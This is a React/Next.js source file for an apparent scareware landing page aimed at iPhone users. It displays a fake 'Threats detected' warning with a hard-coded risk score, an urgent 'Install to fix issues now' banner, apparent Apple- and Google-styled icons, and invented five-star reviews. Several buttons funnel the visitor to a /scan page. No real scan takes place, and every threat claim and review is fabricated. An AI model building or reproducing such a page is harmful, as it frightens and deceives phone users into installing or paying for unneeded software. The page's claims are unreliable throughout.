import Link from 'next/link'

export default function Home() {
	return (
		<>
			<div className='top-marquee-container'>
				<div className='marquee-text'>
					100% Private & Secure. ⚠️ ATTENTION: Your iPhone data is in danger! •
					Install to fix issues now.
				</div>
			</div>

			<div className='app-container'>
				{/* Главный блок с угрозой */}
				<div className='threat-box'>
					<div className='pulse-container'>
						<div className='pulse-circle delay-1'></div>
						<div className='pulse-circle delay-2'></div>
						<div className='pulse-circle delay-3'></div>
						<div className='pulse-circle delay-4'></div>

						<img
							src='/img/applewarn.svg'
							alt='warning'
							className='warning-icon'
						/>
					</div>

					<img
						className='threat-video-bg'
						src='/img/applephone.webp'
						alt='back'
					/>

					<div className='threat-desc'>
						<h1 className='main-title'>Threats detected</h1>

						<div className='threat-score'>
							<h2 className='score-number'>76</h2>
						</div>

						<p className='threat-risk-badge'>Your device may be at risk</p>

						<Link href='/scan' className='threat-btn'>
							Delete all threats
						</Link>
					</div>
				</div>

				{/* Карточка предупреждения */}
				<div className='warning-card'>
					<div className='apple-icon'>
						<img src='/img/gogatt.svg' alt='apple' />
					</div>
					<h2 className='warning-text'>
						<span className='m-sp'>ATTENTION.</span> <br />
						<span>Attackers</span> may intercept your data,{' '}
						<span>passwords, and personal information.</span>
					</h2>
				</div>

				<Link href='/scan' className='btn-blue'>
					Secure Device
				</Link>

				{/* Преимущества */}
				<h2 className='section-title'>WHY CHOOSE US?</h2>

				<ul className='features-grid'>
					<li className='feature-card'>
						<img src='/img/goog-ic1.svg' alt='icon' />
						<p className='feature-title'>Personal Data Shield</p>
						<p className='feature-desc'>
							Scans your email for exposed personal information
						</p>
					</li>
					<li className='feature-card'>
						<img src='/img/goog-ic2.svg' alt='icon' />
						<p className='feature-title'>Email Fraud Detector</p>
						<p className='feature-desc'>
							Detects suspicious messages and phishing attempts
						</p>
					</li>
					<li className='feature-card'>
						<img src='/img/goog-ic3.svg' alt='icon' />
						<p className='feature-title'>Safe Browsing Check</p>
						<p className='feature-desc'>Prevents access to harmful websites</p>
					</li>
					<li className='feature-card'>
						<img src='/img/goog-ic4.svg' alt='icon' />
						<p className='feature-title'>SMS Protection Filter</p>
						<p className='feature-desc'>
							Blocks suspicious and unwanted text messages
						</p>
					</li>
					<li className='feature-card'>
						<img src='/img/goog-ic5.svg' alt='icon' />
						<p className='feature-title'>Mobile Security Guard</p>
						<p className='feature-desc'>
							Keeps your device protected from digital threats
						</p>
					</li>
					<li className='feature-card'>
						<img src='/img/goog-ic6.svg' alt='icon' />
						<p className='feature-title'>Ad & Tracker Defense</p>
						<p className='feature-desc'>
							Stops intrusive ads and invisible tracking tools
						</p>
					</li>
					<li className='feature-card'>
						<img src='/img/goog-ic7.svg' alt='icon' />
						<p className='feature-title'>Battery Care Assistant</p>
						<p className='feature-desc'>
							Improves battery performance and longevity
						</p>
					</li>
					<li className='feature-card'>
						<img src='/img/goog-ic8.svg' alt='icon' />
						<p className='feature-title'>Private Web Connection</p>
						<p className='feature-desc'>
							Secures your internet activity with encryption
						</p>
					</li>
				</ul>

				{/* Отзывы и Рейтинг */}
				<div className='reviews-section'>
					<h2>RATINGS AND REVIEWS</h2>

					<div className='rating-summary'>
						<div className='rating-left'>
							<div className='big-score'>4.9</div>
							<div className='stars'>
								<img src='/img/blue-star.svg' alt='star' />
								<img src='/img/blue-star.svg' alt='star' />
								<img src='/img/blue-star.svg' alt='star' />
								<img src='/img/blue-star.svg' alt='star' />
								<img src='/img/blue-star.svg' alt='star' />
							</div>
							<div className='rating-count'>119 Ratings</div>
						</div>
						<div className='rating-right'>
							<div className='bar-row'>
								<span className='num'>5</span>
								<div className='bar-bg'>
									<div className='bar-fill' style={{ width: '95%' }}></div>
								</div>
							</div>
							<div className='bar-row'>
								<span className='num'>4</span>
								<div className='bar-bg'>
									<div className='bar-fill' style={{ width: '5%' }}></div>
								</div>
							</div>
							<div className='bar-row'>
								<span className='num'>3</span>
								<div className='bar-bg'></div>
							</div>
							<div className='bar-row'>
								<span className='num'>2</span>
								<div className='bar-bg'></div>
							</div>
							<div className='bar-row'>
								<span className='num'>1</span>
								<div className='bar-bg'></div>
							</div>
						</div>
					</div>

					<div className='reviews-list'>
						<div className='review-item'>
							<div className='review-header'>
								<div className='avatar bg-blue'>L</div>
								<div className='user-name'>LUKAS WEBER</div>
							</div>
							<div className='review-meta'>
								<div className='stars'>
									<img src='/img/blue-star.svg' alt='star' />
									<img src='/img/blue-star.svg' alt='star' />
									<img src='/img/blue-star.svg' alt='star' />
									<img src='/img/blue-star.svg' alt='star' />
									<img src='/img/blue-star.svg' alt='star' />
								</div>
								<div className='date'>12.05.2026</div>
							</div>
							<p className='review-text'>
								I had been looking for an app I could fully trust with
								protecting my personal information. It works quietly in the
								background, does not get in the way of using my phone, and does
								not slow it down. Excellent solution.
							</p>
						</div>

						<div className='review-item'>
							<div className='review-header'>
								<div className='avatar bg-purple'>M</div>
								<div className='user-name'>MARTA JENSEN</div>
							</div>
							<div className='review-meta'>
								<div className='stars'>
									<img src='/img/blue-star.svg' alt='star' />
									<img src='/img/blue-star.svg' alt='star' />
									<img src='/img/blue-star.svg' alt='star' />
									<img src='/img/blue-star.svg' alt='star' />
									<img src='/img/blue-star.svg' alt='star' />
								</div>
								<div className='date'>23.05.2026</div>
							</div>
							<p className='review-text'>
								The app does a good job of protecting data without overloading
								the device. Everything runs smoothly, with no freezes or
								noticeable resource drain. I can confidently recommend it.
							</p>
						</div>

						<div className='review-item'>
							<div className='review-header'>
								<div className='avatar bg-green'>E</div>
								<div className='user-name'>EMILIA NOVAK</div>
							</div>
							<div className='review-meta'>
								<div className='stars'>
									<img src='/img/blue-star.svg' alt='star' />
									<img src='/img/blue-star.svg' alt='star' />
									<img src='/img/blue-star.svg' alt='star' />
									<img src='/img/blue-star.svg' alt='star' />
									<img src='/img/blue-star.svg' alt='star' />
								</div>
								<div className='date'>31.05.2026</div>
							</div>
							<p className='review-text'>
								I like that the app runs quietly and steadily in the background.
								My personal data feels protected, and my phone stays just as
								fast. A good option for everyday use.
							</p>
						</div>
					</div>

					<Link href='/scan' className='btn-blue'>
						Check Data
					</Link>
				</div>

				{/* Как это работает */}
				<h2 className='section-title'>HOW IT WORKS</h2>

				<ul className='how-it-works-list'>
					<li className='step-card'>
						<img src='/img/ic-num1.svg' alt='scan' />
						<div className='content-rev'>
							<p className='step-title'>OPEN & SCAN</p>
							<p className='step-desc'>
								Launch the app and check your device while keeping your privacy
								under control.
							</p>
						</div>
					</li>
					<li className='step-card'>
						<img src='/img/ic-num2.svg' alt='scan' />
						<div className='content-rev'>
							<p className='step-title'>REVIEW & BOOST</p>
							<p className='step-desc'>
								Receive clear security insights and tailored recommendations to
								improve protection.
							</p>
						</div>
					</li>
					<li className='step-card'>
						<img src='/img/ic-num3.svg' alt='scan' />
						<div className='content-rev'>
							<p className='step-title'>KEEP IT SAFE</p>
							<p className='step-desc'>
								Resolve potential issues quickly and use your device with
								greater peace of mind.
							</p>
						</div>
					</li>
				</ul>

				{/* Футер */}
				<div>
					<Link
						href='/scan'
						className='btn-blue'
						style={{
							marginBottom: '12px',
							display: 'block',
							textAlign: 'center',
						}}
					>
						Scan your Data
					</Link>

					<div className='footer-secure'>
						<img src='/img/safetygreen.svg' alt='safety' /> 100% Private &
						Secure
					</div>
				</div>

				<div className='footer'>
					<Link href='/policy' className='privacy-link' target='_blank'>
						Privacy Policy
					</Link>
					<div className='copyright'>© 2026. All rights reserved.</div>
				</div>
			</div>
		</>
	)
}
